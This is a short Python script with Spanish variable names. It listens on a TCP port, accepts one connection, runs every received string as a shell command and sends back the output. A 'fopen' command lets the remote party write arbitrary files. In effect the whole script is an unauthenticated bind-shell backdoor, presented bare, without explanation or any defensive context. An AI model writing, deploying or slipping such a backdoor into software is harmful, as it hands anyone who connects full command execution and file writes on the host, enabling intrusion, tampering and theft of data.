import socket
import codecs
import sys
import subprocess
import os
import time

argumento_1 = sys.argv[1]
argumento_2 = int(sys.argv[2])

servidor = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

servidor.bind((argumento_1, argumento_2))

servidor.listen(1)

envio, ip = servidor.accept()

def crear_archivo():
    nombre = envio.recv(4000).decode("utf8")
    contenido = envio.recv(4000).decode("utf8")
    
    lista = [f"{contenido}"]
    
    with open(f"{nombre}", 'w') as fopen:
        for b in lista:
            fopen.write(b)

print("holaaaaaaaaaaa")

print(f"\nnombre de la maquina >> {os.getlogin()} <<\n")

            
while True:
    desempaquetar = envio.recv(4000).decode("utf8")
    
    lista = [desempaquetar]
    
    if lista[0] == "fopen":
        crear_archivo()
        
    else:
        comandos = subprocess.getoutput(lista[0])
        
        empaquetar = str(comandos).encode(encoding="utf-8")
        
        envio.send(empaquetar)
    

        
